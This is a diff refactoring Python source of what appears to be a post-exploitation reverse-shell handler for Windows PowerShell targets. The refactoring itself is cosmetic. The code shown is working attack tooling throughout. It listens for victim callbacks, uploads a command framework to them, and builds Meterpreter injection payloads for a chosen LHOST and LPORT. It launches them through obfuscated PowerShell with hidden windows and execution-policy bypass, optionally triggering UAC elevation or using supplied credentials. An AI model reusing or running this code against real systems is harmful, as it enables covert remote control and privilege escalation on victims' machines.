@@ -224,9 +224,11 @@ class Utility(object):
 
 		holder = ""
 
-		while holder == "" or holder in Utility.collision_list or holder[0].isdigit():
+		while not holder or holder in Utility.collision_list or holder[0].isdigit():
 		#	holder = "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(random.randint(6, 12)))
-			holder = "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(12))
+			holder = "".join(
+			    random.choice(string.ascii_uppercase + string.ascii_lowercase +
+			                  string.digits) for _ in range(12))
 
 		Utility.collision_list.append(holder)
 		return holder
@@ -346,10 +348,10 @@ class Print(object):
 	@staticmethod
 	def text(text="", continuous=False):
 		if continuous:
-			sys.stdout.write("  " + text)
+			sys.stdout.write(f"  {text}")
 			sys.stdout.flush()
 		else:
-			print("  " + text)
+			print(f"  {text}")
 		return len(text)
 
 	@staticmethod
@@ -381,11 +383,11 @@ class Print(object):
 		while True:
 			try:
 				if yes_is_default:
-					return not (input("  \033[38;5;133m[?] " + text + " (Y/n): \033[0m").strip()).lower() in ["n", "no"]
+					return (input("  \033[38;5;133m[?] " + text +
+					              " (Y/n): \033[0m").strip()).lower() not in ["n", "no"]
 				else:
 					return (input("  \033[38;5;133m[?] " + text + " (y/N): \033[0m").strip()).lower() in ["y", "yes"]
 
-			# Catch keyboard interrupt
 			except KeyboardInterrupt:
 				pass
 	
@@ -393,17 +395,17 @@ class Print(object):
 	def size(size):
 		for unit in ["", "K", "M", "G", "T", "P", "E", "Z"]:
 			if abs(size) < 1024.0:
-				return "%3.1f %s" % (size, (unit + "B"))
+				return "%3.1f %s" % (size, f'{unit}B')
 			size /= 1024.0
 		return "%.1f%s%s" % (size, "Yi", suffix)
 	
 	@staticmethod
 	def ETA(start, part, total):
 		elapsed = (time.time() - start)
-		speed = (part / elapsed)		
+		speed = (part / elapsed)
 		eta = ((total - part) / speed)
-		
-		return "ETA: " + str(datetime.timedelta(seconds=int(eta)))
+
+		return f"ETA: {str(datetime.timedelta(seconds=int(eta)))}"
 
 	@staticmethod
 	def add_name_value(name="", value="", func=None):
@@ -1003,15 +1005,11 @@ class Framework(object):
 
 	def Upload(self):
 
-		count = 0
-
-		for fnc in self.framework:
+		for count, fnc in enumerate(self.framework):
 			sys.stdout.write("\b" * Print.status("Uploading framwork: {0:.2f}%".format(count / len(self.framework) * 100), True))
 			self.send_delegate(self.framework[fnc]["function"])
 			self.receive_delegate(0)
-			count += 1
-
-		Print.success("Framework uploaded successfully" + Print.wipe())
+		Print.success(f"Framework uploaded successfully{Print.wipe()}")
 
 	def IsAdmin(self):
 		return self.check_delegate(self.framework["IsAdmin"]["name"]).lower() == "true"
@@ -1116,29 +1114,25 @@ class Listener(object):
 		
 		# Path holder
 		paths = []
-		
+
 		# Iterate though all command definitions
-		for cmd in self.command_definition:	
+		for cmd in self.command_definition:
 			
 			# Add command to paths
 			paths.append(cmd)					
 
 			# Check for command
-			if cmd.startswith(text.split(" ")[0]) and text.split(" ")[0] == cmd:
-				
-				# Check for local dictionart mapping
-				if cmd == "Local-Invoke" or cmd == "Local-Import-Module" or cmd == "Local-Upload":
-					current = text[len(cmd):].strip()
-					for x in glob.glob(current + "*"):
-						paths.append(cmd + " " + x)
-
+			if (cmd.startswith(text.split(" ")[0]) and text.split(" ")[0] == cmd
+			    and cmd in ["Local-Invoke", "Local-Import-Module", "Local-Upload"]):
+				current = text[len(cmd):].strip()
+				paths.extend(f'{cmd} {x}' for x in glob.glob(f'{current}*'))
 		# Exclude all paths not starting with typed text (case insensitive)
 		paths = [path for path in paths if path.lower().startswith(text.lower())]
-		
+
 		# Check if only one command exists
 		if len(paths) == 1 and paths[0] == text:
 			paths = []	# Empty paths
-		
+
 		# Iterate through paths, and return accordingly
 		for path in paths:
 			if not state:
@@ -1221,13 +1215,13 @@ class Listener(object):
 		
 		# Create connection holder
 		self.connection = None
-		
+
 		try:
 			Print.text()
 			self.server.bind((self.lhost, self.lport))
 
 			Print.info("Started reverse handler on %s:%d" % (self.lhost, self.lport))		
-		
+
 			self.server.listen(1)
 			self.connection, address = self.server.accept()
 			fcntl.fcntl(self.server, fcntl.F_SETFL, os.O_NONBLOCK)
@@ -1238,20 +1232,18 @@ class Listener(object):
 			Print.text("\033[38;5;226m\033[48;5;196mBe aware: this is a pseudo powershell. Interactive prompts will result in hangs.\033[0m")
 			Print.text("\033[38;5;226m\033[48;5;196mI.e. netsh, cmd, cat, etc. When calling cmdlets specify all required parameters.\033[0m")
 			Print.text()
-		
-		# Catch socket errors
+
 		except socket.error as e:
 			Print.error(str(e))			
-		
-		# Kill handler on KeyboardInterrupt
+
 		except KeyboardInterrupt:
 			Print.text(Print.wipe(64, True), True)
-			Print.status("Killing handler..." + Print.wipe(64))
+			Print.status(f"Killing handler...{Print.wipe(64)}")
 			try:
 				if self.connection: self.connection.close()
 			except: pass
-			
-		
+
+
 		# Check if connection is open
 		if self.connection:
 
@@ -1307,30 +1299,22 @@ class Listener(object):
 							# Execute command on client
 							self.send_command(command)
 
-					# Catch keyboard interrupt
 					except KeyboardInterrupt:
 						Print.text()
 						if Print.confirm("Are you sure you want to kill the listener?"):
 							break
 						else:
 							self.send_command("")
-							pass
-
-			# Catch socket error
 			except socket.error as e:
 				if e.errno != errno.ECONNRESET:
 					Print.error(str(e))
-				pass
-			
 			self.connection.close()
 			self.server.shutdown(1)
-			self.server.close()
-			
 		else:
 			try:
 				self.server.shutdown(1)
 			except: pass
-			self.server.close()
+		self.server.close()
 
 		Print.info("Closing connection")
 	
@@ -1345,40 +1329,30 @@ class Listener(object):
 
 		# Set the beginning time
 		begin = time.time()
-		
+
 		# Wait for buffer and timespan (this could create an infinite loop, so return on ctrl+c)
 		while not (_buffer and (time.time() - begin) > timespan):
 			
 			try:
-				# Read data in pipe
-				data = self.connection.recv(8192).decode("iso-8859-1")
-				
-				if data:
-
+				if data := self.connection.recv(8192).decode("iso-8859-1"):
 					# Add data to buffer
 					_buffer.append(data)
-					
+
 					# Change the beginning time
 					begin = time.time()
 				else:
-					
 					# Add gap
 					time.sleep(0.1)
-					
-			# If socket error
+
 			except socket.error as e:
 				
 				# Return empty on ECONNRESET
 				if e.errno == errno.ECONNRESET:
 					return ""
-				
-				# Pass on other errors (such as EWOULDBLOCK)
-				pass
-			
-			# Return empty ctrl+c
+
 			except KeyboardInterrupt:
 				return ""
-		
+
 		# Make socket blocking again
 		self.connection.setblocking(1)
 
@@ -1393,18 +1367,18 @@ class Listener(object):
 		response = str(response)
 		error = searcher.search(response)
 		response = searcher.sub("", response).strip().split("\n")
-		
+
 		for i in range(len(response)):
 			if i == len(response) - 1:
-				
+
 				if error:
 					sys.stdout.write(("\n  \033[38;5;196m\033[48;5;16m" + "\033[0m\n  \033[38;5;196m\033[48;5;16m".join((str(error.group(2)).strip()).split("\n"))) + "\033[0m\n")
-				
+
 				prompt = ("  \033[1m\033[38;5;255m" + response[i] + "\033[0m")
 			else:
-				sys.stdout.write("  " + response[i] + "\n")
+				sys.stdout.write(f"  {response[i]}" + "\n")
 		sys.stdout.flush()
-		
+
 		return prompt
 
 	
@@ -1447,14 +1421,14 @@ class Listener(object):
 		
 		# Clear command buffer
 		self.check_command("")
-				
+
 		credential_name = None
 		Print.text()
 		Print.text("Supply values for the following parameters:")
 		lhost = input("  \033[1m\033[38;5;255mLHOST:\033[0m ").strip()
 		lport = input("  \033[1m\033[38;5;255mLPORT:\033[0m ").strip()
 		Print.text()
-		
+
 		Print.text("\033[1m\033[38;5;255mSpecify Credentials:\033[0m Run the Job with different credentials.")
 		if Print.confirm("Specify other credentials?", False):
 			credential_name = Utility.dynamic_variable()
@@ -1462,24 +1436,24 @@ class Listener(object):
 			Print.text("Supply values for the following parameters:")
 			username = input("  \033[1m\033[38;5;255mUsername:\033[0m ").strip()			
 			password = input("  \033[1m\033[38;5;255mPassword:\033[0m ").strip()
-			
+
 			self.framework.CreateCredential(credential_name, username, password)
 		Print.text()
-		
+
 		Print.text("\033[1m\033[38;5;255mASK Elevation:\033[0m This will trigger the UAC (using a so called ASK elevation). This is NOT stealthy.")
 		use_elevation = Print.confirm("Use 'ASK Elevation?'", False)
 		Print.text()
-		
+
 		if (not Utility.is_ipv4_address(lhost)):
 			Print.error("LHOST is not an IP address")
 			lhost = None
-			
+
 		if (not (lport.isdigit() and int(lport) >= 1 and int(lport) <= 65535)):
 			Print.error("LPORT is not a valid port number")
 			lport = None
-			
-		if lhost != None and lport != None:			
-		
+
+		if lhost != None and lport != None:		
+
 			if payload_type == conf_name.METERPRETER:
 				payload = generate_injection(
 					Utility.replace_all(
@@ -1515,11 +1489,11 @@ class Listener(object):
 			self.framework.UploadVariableChunk(variable_name, "")
 
 			# Loop through each data chunk
-			for i in range(int(length / chunk_size) + 1):
+			for i in range(length // chunk_size + 1):
 
 				# Read base64 encoded chunk from file
 				self.framework.UploadVariableChunk(variable_name, base64.b64encode(payload[(i * chunk_size):(i * chunk_size + chunk_size)]).decode("utf-8", "ignore"))
-				uploaded += (length - uploaded) if ((length - uploaded) < chunk_size) else chunk_size
+				uploaded += min(length - uploaded, chunk_size)
 
 				# Print sexy status
 				sys.stdout.write("\b" * Print.status(
@@ -1535,48 +1509,61 @@ class Listener(object):
 
 			# Check integrity (of variable)
 			if (self.framework.VariableSum(variable_name).lower() == hashlib.md5(payload).hexdigest().lower()):
-				Print.success("Upload completed" + Print.wipe())
+				Print.success(f"Upload completed{Print.wipe()}")
 
 				sys.stdout.write("\b" * Print.status("Launching background job...", True))
 
 				# Invoke payload!
-				self.check_command("$" + variable_name + " = [scriptblock]::Create((new-object -TypeName System.Text.UTF8Encoding).GetString([Convert]::FromBase64String($" + variable_name + ")))")
+				self.check_command(
+				    f"${variable_name}" +
+				    " = [scriptblock]::Create((new-object -TypeName System.Text.UTF8Encoding).GetString([Convert]::FromBase64String($"
+				    + variable_name + ")))")
 
 				# Escape payload back to string, and back to scriptblock
-				self.check_command("$" + variable_name + " = $" + variable_name + ".ToString() -replace \"\\$\",\"``$\"")
-					
+				self.check_command(f"${variable_name} = ${variable_name}" +
+				                   ".ToString() -replace \"\\$\",\"``$\"")
+
 				# Check if elevation should be used
 				if use_elevation:
-					self.check_command("$" + variable_name + " = [scriptblock]::Create(\"(Start-Process " + powershell_obfuscation("[_OBF_POWERSHELL_] -[_OBF_PASSTHRU_] -[_OBF_VERB_] [_OBF_RUNAS_] -[_OBF_ARGUMENTLIST_] `\"-[_OBF_NONINTERACTIVE_] -[_OBF_NOLOGO_] -[_OBF_NOPROFILE_] -[_OBF_WINDOWSTYLE_] [_OBF_HIDDEN_] -[_OBF_EXECUTIONPOLICY_] [_OBF_BYPASS_] -[_OBF_COMMAND_] $" + variable_name + "`\"") + ").ID\")")
-				
-				# Execute with -NoNewWindow
-				else:
-					self.check_command("$" + variable_name + " = [scriptblock]::Create(\"(Start-Process " + powershell_obfuscation("[_OBF_POWERSHELL_] -[_OBF_PASSTHRU_] -[_OBF_NONEWWINDOW_] -[_OBF_ARGUMENTLIST_] `\"-[_OBF_NONINTERACTIVE_] -[_OBF_NOLOGO_] -[_OBF_NOPROFILE_] -[_OBF_WINDOWSTYLE_] [_OBF_HIDDEN_] -[_OBF_EXECUTIONPOLICY_] [_OBF_BYPASS_] -[_OBF_COMMAND_] $" + variable_name + "`\"") + ").ID\")")
+					self.check_command(
+					    f"${variable_name}" + " = [scriptblock]::Create(\"(Start-Process " +
+					    powershell_obfuscation(
+					        "[_OBF_POWERSHELL_] -[_OBF_PASSTHRU_] -[_OBF_VERB_] [_OBF_RUNAS_] -[_OBF_ARGUMENTLIST_] `\"-[_OBF_NONINTERACTIVE_] -[_OBF_NOLOGO_] -[_OBF_NOPROFILE_] -[_OBF_WINDOWSTYLE_] [_OBF_HIDDEN_] -[_OBF_EXECUTIONPOLICY_] [_OBF_BYPASS_] -[_OBF_COMMAND_] $"
+					        + variable_name + "`\"") + ").ID\")")
 
-				if credential_name == None:
-					self.check_command("Start-Job -Name " + job_name + " -ScriptBlock $" + variable_name)
 				else:
-					self.check_command("Start-Job -Name " + job_name + " -ScriptBlock $" + variable_name + " -Credential $" + credential_name )
-					self.check_command("Remove-Variable -Name " + credential_name)
+					self.check_command(
+					    f"${variable_name}" + " = [scriptblock]::Create(\"(Start-Process " +
+					    powershell_obfuscation(
+					        "[_OBF_POWERSHELL_] -[_OBF_PASSTHRU_] -[_OBF_NONEWWINDOW_] -[_OBF_ARGUMENTLIST_] `\"-[_OBF_NONINTERACTIVE_] -[_OBF_NOLOGO_] -[_OBF_NOPROFILE_] -[_OBF_WINDOWSTYLE_] [_OBF_HIDDEN_] -[_OBF_EXECUTIONPOLICY_] [_OBF_BYPASS_] -[_OBF_COMMAND_] $"
+					        + variable_name + "`\"") + ").ID\")")
 
-				Print.success("Job started: " + job_name)
+				if credential_name is None:
+					self.check_command(f"Start-Job -Name {job_name} -ScriptBlock ${variable_name}")
+				else:
+					self.check_command(
+					    f"Start-Job -Name {job_name} -ScriptBlock ${variable_name}" +
+					    " -Credential $" + credential_name)
+					self.check_command(f"Remove-Variable -Name {credential_name}")
+
+				Print.success(f"Job started: {job_name}")
 				Print.info("Check status with \033[1m\033[38;5;255mGet-Job " + job_name + "\033[0m")
 				Print.info("Check process ID with \033[1m\033[38;5;255m(Get-Job " + job_name + ").ChildJobs.Output\033[0m or \033[1m\033[38;5;255m(((Get-Job " + job_name + ").ChildJobs)|Select Output).Output\033[0m")
 
 
 			else:
-				Print.error("Integrity check failed" + Print.wipe())
+				Print.error(f"Integrity check failed{Print.wipe()}")
 
 			# Remove variable after it has been used
-			self.check_command("Remove-Variable -Name " + variable_name)
-		
+			self.check_command(f"Remove-Variable -Name {variable_name}")
+
 		else:
 			Print.error("Incorrect values were specified")
-			
-		
+
+
 		# Print empty line
 		Print.text()
-		
+
 		# Send empty command to load buffer
 		self.send_command("")
 		
